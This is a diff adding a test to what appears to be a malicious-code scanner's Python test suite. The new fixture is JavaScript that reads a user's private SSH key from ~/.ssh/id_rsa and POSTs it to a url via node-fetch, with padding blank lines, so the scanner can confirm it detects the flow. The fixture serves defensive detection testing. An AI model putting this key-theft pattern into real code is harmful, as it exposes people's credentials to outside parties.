@@ -129,3 +129,14 @@ class TestTheGrade:
 
         grades = self.grade(tmp_path, "import discord\n" + self.STORE_THEN_INSTALLER)
         assert any(g >= Severity.HIGH for g in grades)
+
+
+class TestAnImportedClient:
+    def test_the_call_of_an_imported_client_is_where_the_request_is(self):
+        text = (
+            'import fetch from "node-fetch";\n'
+            "\n" * 6 + 'const keyDir = path.join(os.homedir(), ".ssh");\n'
+            "const body = fs.readFileSync(path.join(keyDir, 'id_rsa'));\n"
+            "\n" * 4 + "await fetch(url, { method: 'POST', body });\n"
+        )
+        assert FlowKit.flows(text, ".ssh", "node-fetch")
